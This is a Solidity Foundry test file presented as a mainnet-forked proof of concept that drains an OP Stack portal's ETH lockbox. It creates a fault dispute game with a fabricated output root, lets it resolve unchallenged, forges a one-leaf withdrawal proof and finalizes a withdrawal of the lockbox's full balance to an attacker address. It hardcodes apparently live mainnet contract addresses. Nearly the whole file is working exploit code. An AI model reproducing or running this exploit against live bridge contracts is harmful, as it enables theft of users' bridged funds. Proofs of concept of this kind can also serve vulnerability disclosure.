// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";

/// @title ProductionPoC
/// @notice Mainnet-forked proof of the OP Stack L1 trust gap.
///         This file assumes only:
///           - an EOA with 0.08 ETH initBond + gas
///           - a mainnet (or mainnet-fork) RPC
///           - no honest challenger counters the game within maxClockDuration
///         No SDM. No L2 state. No storage/call/code mocking.
///         Only fork-time controls (vm.warp, vm.deal) are used.

struct WdTx {
    uint256 nonce;
    address sender;
    address target;
    uint256 value;
    uint256 gasLimit;
    bytes data;
}

struct OutputRootProof {
    bytes32 version;
    bytes32 stateRoot;
    bytes32 messagePasserStorageRoot;
    bytes32 latestBlockhash;
}

interface IETHLockbox {
    function authorizedPortals(address) external view returns (bool);
    function paused() external view returns (bool);
    function version() external view returns (string memory);
}

interface IPortal {
    function proveWithdrawalTransaction(WdTx memory, uint256, OutputRootProof memory, bytes[] memory) external;
    function finalizeWithdrawalTransactionExternalProof(WdTx memory, address) external;
    function l2Sender() external view returns (address);
    function ethLockbox() external view returns (address);
    function anchorStateRegistry() external view returns (address);
    function provenWithdrawals(bytes32, address) external view returns (address, uint64);
    function finalizedWithdrawals(bytes32) external view returns (bool);
    function proofMaturityDelaySeconds() external view returns (uint256);
    function paused() external view returns (bool);
    function version() external view returns (string memory);
}

interface IAnchorStateRegistry {
    function disputeGameFactory() external view returns (address);
    function respectedGameType() external view returns (uint32);
    function disputeGameFinalityDelaySeconds() external view returns (uint256);
    function isGameClaimValid(address) external view returns (bool);
    function getAnchorRoot() external view returns (bytes32, uint256);
}

interface IDisputeGameFactory {
    function create(uint32, bytes32, bytes calldata) external payable returns (address);
    function gameCount() external view returns (uint256);
    function gameAtIndex(uint256) external view returns (uint32, uint64, address);
    function initBonds(uint32) external view returns (uint256);
}

interface IFaultDisputeGame {
    function rootClaim() external view returns (bytes32);
    function status() external view returns (uint8);
    function resolveClaim(uint256, uint256) external;
    function resolve() external returns (uint8);
    function maxClockDuration() external view returns (uint64);
    function createdAt() external view returns (uint64);
    function resolvedAt() external view returns (uint64);
    function l2BlockNumber() external view returns (uint256);
    function claimDataLen() external view returns (uint256);
}

contract ProductionPoC is Test {
    address constant PORTAL = 0xbEb5Fc579115071764c7423A4f12eDde41f106Ed;
    address constant LOCKBOX = 0x322b47Ff1FA8D5611F761e3E275C45B71b294D43;

    IPortal portal = IPortal(PORTAL);
    IETHLockbox lockbox = IETHLockbox(LOCKBOX);

    address attacker;
    address asr;
    address dgf;
    uint32 respectedGameType;
    uint256 initBond;
    uint256 proofMaturityDelay;
    uint256 disputeGameFinalityDelay;

    function setUp() public {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"));

        asr = portal.anchorStateRegistry();
        dgf = IAnchorStateRegistry(asr).disputeGameFactory();
        respectedGameType = IAnchorStateRegistry(asr).respectedGameType();
        initBond = IDisputeGameFactory(dgf).initBonds(respectedGameType);
        proofMaturityDelay = portal.proofMaturityDelaySeconds();
        disputeGameFinalityDelay = IAnchorStateRegistry(asr).disputeGameFinalityDelaySeconds();

        attacker = makeAddr("production-attacker");
        vm.deal(attacker, 1 ether);
    }

    function _hashWd(WdTx memory t) internal pure returns (bytes32) {
        return keccak256(abi.encode(t.nonce, t.sender, t.target, t.value, t.gasLimit, t.data));
    }

    /// @notice Build a one-leaf MPT for `L2ToL1MessagePasser.sentMessages[wdHash] = 1`.
    function _forgeMessagePasserTrie(bytes32 wdHash)
        internal
        pure
        returns (bytes32 storageRoot, bytes[] memory withdrawalProof)
    {
        bytes32 storageKey = keccak256(abi.encode(wdHash, uint256(0)));
        bytes32 pathHash = keccak256(abi.encode(storageKey));
        bytes memory leaf = abi.encodePacked(hex"e3a120", pathHash, hex"01");
        storageRoot = keccak256(leaf);
        withdrawalProof = new bytes[](1);
        withdrawalProof[0] = leaf;
    }

    function _createAndResolveGame(bytes32 outputRoot)
        internal
        returns (address gameAddr, uint256 gameIndex)
    {
        (, uint256 anchorL2Block) = IAnchorStateRegistry(asr).getAnchorRoot();
        bytes memory extraData = abi.encode(anchorL2Block + 1);

        vm.prank(attacker);
        gameAddr = IDisputeGameFactory(dgf).create{value: initBond}(respectedGameType, outputRoot, extraData);

        gameIndex = IDisputeGameFactory(dgf).gameCount() - 1;

        assertEq(IFaultDisputeGame(gameAddr).rootClaim(), outputRoot, "root claim mismatch");
        assertEq(IFaultDisputeGame(gameAddr).status(), 0, "game must be IN_PROGRESS");

        // Wait out the challenge clock.
        uint64 gameCreatedAt = IFaultDisputeGame(gameAddr).createdAt();
        uint64 maxClock = IFaultDisputeGame(gameAddr).maxClockDuration();
        vm.warp(gameCreatedAt + maxClock + 1);

        // Resolve. With no counter, the root claim wins.
        vm.startPrank(attacker);
        IFaultDisputeGame(gameAddr).resolveClaim(0, 0);
        uint8 status = IFaultDisputeGame(gameAddr).resolve();
        vm.stopPrank();

        assertEq(status, 2, "resolve() must return DEFENDER_WINS");

        // Wait the finality delay.
        uint64 resolvedAt = IFaultDisputeGame(gameAddr).resolvedAt();
        vm.warp(resolvedAt + disputeGameFinalityDelay + 1);

        assertTrue(IAnchorStateRegistry(asr).isGameClaimValid(gameAddr), "game claim must be valid");
    }

    function _proveAndFinalize(address gameAddr, uint256 gameIndex, uint256 amount)
        internal
    {
        WdTx memory wd = WdTx({
            nonce: uint256(keccak256("production-poc-nonce")),
            sender: attacker,
            target: attacker,
            value: amount,
            gasLimit: 100_000,
            data: ""
        });
        bytes32 wdHash = _hashWd(wd);

        (bytes32 storageRoot, bytes[] memory withdrawalProof) = _forgeMessagePasserTrie(wdHash);

        OutputRootProof memory orp = OutputRootProof({
            version: bytes32(0),
            stateRoot: keccak256("no-such-l2-state-root"),
            messagePasserStorageRoot: storageRoot,
            latestBlockhash: keccak256("no-such-l2-block")
        });
        bytes32 outputRoot =
            keccak256(abi.encode(orp.version, orp.stateRoot, orp.messagePasserStorageRoot, orp.latestBlockhash));

        assertEq(outputRoot, IFaultDisputeGame(gameAddr).rootClaim(), "output root must match game root");

        // Prove the withdrawal against the fabricated root.
        vm.prank(attacker);
        portal.proveWithdrawalTransaction(wd, gameIndex, orp, withdrawalProof);

        (address provenGame, uint64 provenAt) = portal.provenWithdrawals(wdHash, attacker);
        assertEq(provenGame, gameAddr, "proven against wrong game");
        assertTrue(provenAt != 0, "proof timestamp must be set");

        // Wait the proof maturity delay.
        vm.warp(provenAt + proofMaturityDelay + 1);

        uint256 lockboxBefore = LOCKBOX.balance;
        uint256 attackerBefore = attacker.balance;

        // Finalize and drain.
        vm.prank(attacker);
        portal.finalizeWithdrawalTransactionExternalProof(wd, attacker);

        assertEq(LOCKBOX.balance, lockboxBefore - amount, "lockbox must decrease by amount");
        assertEq(attacker.balance - attackerBefore, amount, "attacker must receive amount");
        assertTrue(portal.finalizedWithdrawals(wdHash), "withdrawal must be finalized");
    }

    /// @notice OP Mainnet live parameters at the fork block.
    function test_0_liveParams() public view {
        console.log("=== Production PoC live parameters ===");
        console.log("  portal          :", PORTAL, portal.version());
        console.log("  lockbox         :", LOCKBOX, lockbox.version());
        console.log("  ASR             :", asr);
        console.log("  DGF             :", dgf);
        console.log("  lockbox balance :", LOCKBOX.balance);
        console.log("  respectedGameType:", respectedGameType);
        console.log("  initBond (wei)  :", initBond);
        console.log("  proofMaturity   :", proofMaturityDelay);
        console.log("  finalityDelay   :", disputeGameFinalityDelay);

        assertTrue(lockbox.authorizedPortals(PORTAL), "portal must be authorized");
        assertFalse(portal.paused(), "portal must not be paused");
    }

    /// @notice Full chain: fabricated output root -> DEFENDER_WINS -> drain.
    function test_production_trustGap_drain() public {
        uint256 amount = LOCKBOX.balance;

        WdTx memory wd = WdTx({
            nonce: uint256(keccak256("production-poc-nonce")),
            sender: attacker,
            target: attacker,
            value: amount,
            gasLimit: 100_000,
            data: ""
        });
        bytes32 wdHash = _hashWd(wd);

        (bytes32 storageRoot,) = _forgeMessagePasserTrie(wdHash);
        bytes32 outputRoot =
            keccak256(abi.encode(bytes32(0), keccak256("no-such-l2-state-root"), storageRoot, keccak256("no-such-l2-block")));

        (address gameAddr, uint256 gameIndex) = _createAndResolveGame(outputRoot);
        _proveAndFinalize(gameAddr, gameIndex, amount);

        assertEq(LOCKBOX.balance, 0, "lockbox must be empty");
        console.log("=== production drain ===");
        console.log("  game address    :", gameAddr);
        console.log("  drained (wei)   :", amount);
    }
}
